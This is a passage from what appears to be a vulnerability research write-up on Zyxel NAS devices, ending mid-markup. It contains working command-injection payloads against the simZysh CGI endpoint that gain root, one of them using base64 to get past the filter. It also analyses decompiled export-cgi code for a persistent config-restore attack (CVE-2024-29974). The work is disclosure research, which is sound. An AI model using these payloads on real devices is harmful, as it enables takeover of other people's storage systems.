<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="c0=’storage_ext_cgi CGIGetExtStoInfo None) and False or __import__(&quot;subprocess&quot;).check_output(&quot;/usr/local/apache/web_framework/bin/executer_su /bin/id&quot;, shell=True)#’

200 OK
{
&quot;errno0&quot;: 0,
&quot;errmsg0&quot;: &quot;OK&quot;,
&quot;zyshdata0&quot;: [
&quot;uid=0(root) gid=99(nobody) egid=0(root) groups=99(nobody)\n&quot;
]
}" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #D8DEE9">c0</span><span style="color: #81A1C1">=</span><span style="color: #A3BE8C">’storage_ext_cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">CGIGetExtStoInfo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">None</span><span style="color: #D8DEE9FF">) and False or __import__</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;subprocess&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">.check_output</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">&quot;/usr/local/apache/web_framework/bin/executer_su /bin/id&quot;</span><span style="color: #88C0D0">,</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">shell=True</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">#’</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88C0D0">200</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">OK</span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errno0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">0</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;errmsg0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">OK</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">,</span></span>
<span class="line"><span style="color: #88C0D0">&quot;zyshdata0&quot;</span><span style="color: #88C0D0">:</span><span style="color: #D8DEE9FF"> [</span></span>
<span class="line"><span style="color: #88C0D0">&quot;uid=0(root) gid=99(nobody) egid=0(root) groups=99(nobody)\n&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">]</span></span>
<span class="line"><span style="color: #ECEFF4">}</span></span></code></pre></div>



<p>That’s a nice privilege escalation, giving us an easy root.</p>



<h3 class="wp-block-heading" id="h-bonus-escaping-filtration"><span class="ez-toc-section" id="bonus-escaping-filtration"></span><a>Bonus: Escaping filtration</a><span class="ez-toc-section-end"></span></h3>



<p>The command injection we found in simZysh is filtered, remember? Well, I wanted to bypass that filtration for use in a proof of concept and thought of this neat way to do it. We already know we can stack evals as shown earlier with the help of boolean operators. We also know that the characters (, ), “, whitespace and _ are allowed. The “eval()” call has access to __import__ as well, and Python happens to have a native base64 library. Combining that, we can take our payload containing banned characters and base64 encode it, only to have the server decode it into its “eval()”.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="POST /cmd,/simZysh/register_main/setCookie
c0=’storage_ext_cgi CGIGetExtStoInfo and False or eval(__import__(&quot;base64&quot;).b64decode(“X19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiL3Vzci9sb2NhbC9hcGFjaGUvd2ViX2ZyYW1ld29yay9iaW4vZXhlY3V0ZXJfc3UgL2Jpbi9zaCAtYyAgImVjaG8gJ1RoaXMgY29tbWFuZCBjb250YWlucyBiYW5uZWQgY2hhcmFjdGVyc1wkJzsgZWNobyBTdWNjZXNzIiIsIHNoZWxsPVRydWUp”))#’" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">POST</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">/cmd,/simZysh/register_main/setCookie</span></span>
<span class="line"><span style="color: #D8DEE9">c0</span><span style="color: #81A1C1">=</span><span style="color: #A3BE8C">’storage_ext_cgi</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">CGIGetExtStoInfo</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">and</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">False</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">or</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">eval</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">__import__(</span><span style="color: #88C0D0">&quot;base64&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #A3BE8C">.b64decode</span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">“X19pbXBvcnRfXygic3VicHJvY2VzcyIpLmNoZWNrX291dHB1dCgiL3Vzci9sb2NhbC9hcGFjaGUvd2ViX2ZyYW1ld29yay9iaW4vZXhlY3V0ZXJfc3UgL2Jpbi9zaCAtYyAgImVjaG8gJ1RoaXMgY29tbWFuZCBjb250YWlucyBiYW5uZWQgY2hhcmFjdGVyc1wkJzsgZWNobyBTdWNjZXNzIiIsIHNoZWxsPVRydWUp”</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF">)#’</span></span></code></pre></div>



<h3 class="wp-block-heading" id="h-cve-2024-29974-persistent-remote-code-execution-vulnerability"><span class="ez-toc-section" id="cve-2024-29974-%e2%80%93-persistent-remote-code-execution-vulnerability"></span><a>CVE-2024-29974 – Persistent Remote Code Execution Vulnerability</a><span class="ez-toc-section-end"></span></h3>



<p>Currently our arsenal is equipped with a backdoor, two privilege escalation vulnerabilities, and a command injection vulnerability. This may sound great, but sadly the device wipes the backdoor upon reboot. Wouldn’t it be sweet if we found a way to compromise the device persistently without relying on those vulnerabilities?</p>



<p>Putting a bit of thought into the NAS design, what is persistent on it? Obviously, any pictures and files stored in the NAS volumes, otherwise the device would be pointless, but what else? My idea is: the firmware and the configs.</p>



<p>Looking around in the UI I noticed that there was a function for backing up and restoring configurations for the device.</p>



<figure class="wp-block-image size-large"><img decoding="async" src="//outpost24.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-lazy-type="image" data-src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image9-1024x517.png" alt="" class="lazy lazy-hidden wp-image-5616" /><noscript><img decoding="async" src="https://outpost24.com/fr/wp-content/uploads/sites/3/2024/05/image9-1024x517.png" alt="" class="wp-image-5616" /></noscript></figure>



<p>Playing around with this feature, I saw usages of the “export-cgi” and “file_upload-cgi&#8221; endpoints. CGI related binaries? Sounds like we’re quite familiar with that by now.</p>



<p>The downloaded backups appear to be in some odd format, maybe proprietary. Searching them for strings and investigating them with “file” didn’t reveal much of value either, so let’s dig into what they are by decompiling “export-cgi&#8221;.</p>



<h4 class="wp-block-heading" id="h-export-cgi">export-cgi</h4>



<p>We know that the downloaded files are suffixed with “.rom”, so we’ll start by looking for usages of that string.</p>



<p>The search guides us to a neat function which is responsible for creating the exported “rom” file we saw from the web interface:</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="int execute_as_su_gen_tmp_zyconf_gz(char *param_1,char *param_2)
 
{
  //  [...]
  char tar_name[] = '/tmp/zyconf.tgz ';
  // [...]
  char excluded_file[] = '/tmp/excludeList ';
  // [...]
  pFVar1 = fopen(&quot;/etc/modelname&quot;,&quot;r&quot;);
  if (pFVar1 != (FILE *)0x0) {
    __stream = popen(&quot;date +%Y-%m-%d_%H%M&quot;,&quot;r&quot;);
    __isoc99_fscanf(__stream,&quot;%s&quot;,date_suffix);
    pclose(__stream);
    __isoc99_fscanf(pFVar1,&quot;%s&quot;,modelname_buf);
    pcVar2 = strstr(modelname_buf,&quot;NSA310a&quot;);
    if (pcVar2 == (char *)0x0) {
      sprintf(COMMAND_ARGS_ARR_ARR[0],&quot;%s_%s.rom&quot;,modelname_buf,date_suffix);
    }
    else {
      sprintf(COMMAND_ARGS_ARR_ARR[0],&quot;%s_%s.rom&quot;,&quot;NSA310&quot;,date_suffix);
    }
    fclose(pFVar1);
  }
  // [...]
    pFVar1 = popen(&quot;/usr/local/apache/web_framework/bin/executer_su /firmware/sbin/info_printenv MODEL_ID&quot;
                   ,&quot;r&quot;);
  // [...]
      pclose(pFVar1);
      pFVar1 = fopen(excluded_file,&quot;w&quot;);
      if (pFVar1 != (FILE *)0x0) {
        fwrite(&quot;pkg_conf\n&quot;,1,9,pFVar1);
        fwrite(&quot;target\n&quot;,1,7,pFVar1);
        fclose(pFVar1);
        sprintf(cmd,&quot;/bin/tar -zcvf \&quot;%s\&quot; . -C /etc/zyxel -X %s&quot;,tar_name,excluded_file);
        system(cmd);
        remove(excluded_file);
        sprintf(cmd,&quot;ram2bin -i \&quot;%s\&quot; -o \&quot;/tmp/%s\&quot; -e \&quot;%s\&quot; -t 9 -m %s&quot;,tar_name,
                COMMAND_ARGS_ARR_ARR,&quot;1.1&quot;,parsed_id);
        system(cmd);
  // [...]" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #81A1C1">int</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">execute_as_su_gen_tmp_zyconf_gz</span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9">param_1</span><span style="color: #ECEFF4">,</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #D8DEE9">param_2</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">//  [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> tar_name</span><span style="color: #81A1C1">[]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">/tmp/zyconf.tgz </span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> excluded_file</span><span style="color: #81A1C1">[]</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">&#039;</span><span style="color: #A3BE8C">/tmp/excludeList </span><span style="color: #ECEFF4">&#039;</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">  pFVar1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">fopen</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/etc/modelname</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">r</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1 </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">FILE </span><span style="color: #81A1C1">*</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">    __stream </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">popen</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">date +</span><span style="color: #D8DEE9">%</span><span style="color: #A3BE8C">Y-</span><span style="color: #D8DEE9">%</span><span style="color: #A3BE8C">m-%d_</span><span style="color: #D8DEE9">%</span><span style="color: #A3BE8C">H</span><span style="color: #D8DEE9">%</span><span style="color: #A3BE8C">M</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">r</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">__isoc99_fscanf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">__stream</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">date_suffix</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">pclose</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">__stream</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">__isoc99_fscanf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">modelname_buf</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    pcVar2 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">strstr</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">modelname_buf</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">NSA310a</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pcVar2 </span><span style="color: #81A1C1">==</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #81A1C1">char</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">*</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">COMMAND_ARGS_ARR_ARR</span><span style="color: #ECEFF4">[</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">],</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">%s_%s.rom</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">modelname_buf</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">date_suffix</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #81A1C1">else</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">COMMAND_ARGS_ARR_ARR</span><span style="color: #ECEFF4">[</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">],</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">%s_%s.rom</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">NSA310</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">date_suffix</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #D8DEE9FF">    </span><span style="color: #88C0D0">fclose</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">  </span><span style="color: #ECEFF4">}</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">    pFVar1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">popen</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/usr/local/apache/web_framework/bin/executer_su /firmware/sbin/info_printenv MODEL_ID</span><span style="color: #ECEFF4">&quot;</span></span>
<span class="line"><span style="color: #D8DEE9FF">                   </span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">r</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #88C0D0">pclose</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">      pFVar1 </span><span style="color: #81A1C1">=</span><span style="color: #D8DEE9FF"> </span><span style="color: #88C0D0">fopen</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">excluded_file</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">w</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">      </span><span style="color: #81A1C1">if</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1 </span><span style="color: #81A1C1">!=</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">FILE </span><span style="color: #81A1C1">*</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">0x</span><span style="color: #B48EAD">0</span><span style="color: #ECEFF4">)</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">{</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">fwrite</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">pkg_conf</span><span style="color: #EBCB8B">\n</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">1</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">9</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">fwrite</span><span style="color: #ECEFF4">(</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">target</span><span style="color: #EBCB8B">\n</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">1</span><span style="color: #ECEFF4">,</span><span style="color: #B48EAD">7</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">fclose</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">pFVar1</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">cmd</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">/bin/tar -zcvf </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C"> . -C /etc/zyxel -X %s</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">tar_name</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">excluded_file</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">cmd</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">remove</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">excluded_file</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">sprintf</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">cmd</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">ram2bin -i </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C"> -o </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">/tmp/%s</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C"> -e </span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C">%s</span><span style="color: #EBCB8B">\&quot;</span><span style="color: #A3BE8C"> -t 9 -m %s</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">tar_name</span><span style="color: #ECEFF4">,</span></span>
<span class="line"><span style="color: #D8DEE9FF">                COMMAND_ARGS_ARR_ARR</span><span style="color: #ECEFF4">,</span><span style="color: #ECEFF4">&quot;</span><span style="color: #A3BE8C">1.1</span><span style="color: #ECEFF4">&quot;</span><span style="color: #ECEFF4">,</span><span style="color: #D8DEE9FF">parsed_id</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #D8DEE9FF">        </span><span style="color: #88C0D0">system</span><span style="color: #ECEFF4">(</span><span style="color: #D8DEE9FF">cmd</span><span style="color: #ECEFF4">)</span><span style="color: #81A1C1">;</span></span>
<span class="line"><span style="color: #ECEFF4">  </span><span style="color: #616E88">// [...]</span></span></code></pre></div>



<p>A lot of code has been omit for brevity, but here’s the important parts of what’s going on:</p>



<ol class="wp-block-list">
<li>The function grabs the name of the device from /etc/modelname</li>



<li>It gets the current date for use in the output filename</li>



<li>It grabs the model_id from the environment using /firmware/sbin/info_printenv
<ol class="wp-block-list">
<li>The model ID is a 4 character hex identifier.</li>
</ol>
</li>



<li>It packs /etc/zyxel into /tmp/zyconf.tgz</li>



<li>/tmp/zyconf.tgz is converted into the resulting “rom” file with the help of ram2bin. This is the utility we are interested in to get more information about the format they exported. It is fed a couple of parameters
<ul class="wp-block-list">
<li>-i , in this case /etc/zyconf.tgz</li>



<li>-o /tmp/, the resulting file</li>



<li>-e “1.1” which we will simply refer to as “magic string”</li>



<li>-t “9” which is a magic number we will return to later.</li>



<li>-X /tmp/excludeList, suggesting there is some special handling for a chosen file. I never bothered figuring out which, but a guess I will not expand upon would be /etc/zyxel/zylist, or which files should not be overwritten when importing the config. I leave figuring this out as an exercise for the reader.</li>



<li>-m “modelid”, i.e. that hex identifier it grabbed in step 3.</li>
</ul>
</li>
</ol>



<p>The modelid from step 3 appears to be a hexadecimal representation of the NAS model, so an attacker would need to know which NAS device they’re targeting.</p>



<p>As for “9” in the “-t” parameter? Calling &#8220;ram2bin –h&#8221; tells us its the image type, which will show up once more upon decompiling file_upload-cgi.</p>



<div class="wp-block-kevinbatdorf-code-block-pro" data-code-block-pro-font-family="Code-Pro-JetBrains-Mono" style="font-size:.875rem;font-family:Code-Pro-JetBrains-Mono,ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,monospace;line-height:1.25rem;--cbp-tab-width:2"><span role="button" data-code="/ $ ram2bin -h
 
Copyright (C) 2000-2001 ZyXEL Communications, Corp.
All Rights Reserved.
 
RAM2BIN(Image Conversion) (Jan  2 2024)
(rewritten subset of CONV723.EXE)
 
 
Usage: ram2bin [-h] [-b] [-q] -e &lt;string&gt; -t &lt;type&gt; -i &lt;filename&gt; [-f | -o &lt;filename&gt;] -m &lt;modelnum&gt;
 
  -h          display this help and exit
  -b          big endian, default is little endian.
              It means the type of working machine which this program runs on, not the output type.
  -f          fast mode, only count checksum, no header added
  -q          quiet mode, only print out checksum instead of other user-friendly messages
  -e          write a string within 15 characters to header
  -t          ROM image type, integer value
  -i          input filename
  -o          output filename
  -m          Model Number, 2 byte hex value" style="color:#d8dee9ff" aria-label="Copy" class="code-block-pro-copy-button"></span><pre class="shiki nord" style="background-color: #2e3440ff"><code><span class="line"><span style="color: #88C0D0">/</span><span style="color: #D8DEE9FF"> $ </span><span style="color: #A3BE8C">ram2bin</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">-h</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #88C0D0">Copyright</span><span style="color: #D8DEE9FF"> (C) 2000-2001 ZyXEL Communications, Corp.</span></span>
<span class="line"><span style="color: #88C0D0">All</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">Rights</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">Reserved.</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #88C0D0">RAM2BIN(Image</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">Conversion</span><span style="color: #D8DEE9FF">) </span><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">Jan</span><span style="color: #D8DEE9FF">  </span><span style="color: #B48EAD">2</span><span style="color: #D8DEE9FF"> </span><span style="color: #B48EAD">2024</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #ECEFF4">(</span><span style="color: #88C0D0">rewritten</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">subset</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">of</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">CONV723.EXE</span><span style="color: #ECEFF4">)</span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #D8DEE9FF"> </span></span>
<span class="line"><span style="color: #88C0D0">Usage:</span><span style="color: #D8DEE9FF"> </span><span style="color: #A3BE8C">ram2bin</span><span style="color: #D8DEE9FF"> [-h] </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">-b</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">-q</span><span style="color: #ECEFF4">]</span><span style="color: #D8DEE9FF"> -e </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">string</span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF"> -t </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">type</span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF"> -i </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">filename</span><span style="color: #81A1C1">&gt;</span><span style="color: #D8DEE9FF"> </span><span style="color: #ECEFF4">[</span><span style="color: #D8DEE9FF">-f </span><span style="color: #81A1C1">|</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">-o</span><span style="color: #D8DEE9FF"> </span><span style="color: #81A1C1">&lt;</span><span style="color: #D8DEE9FF">filename</span><span style="color: #81A1C1">&gt;</span><span style="color: 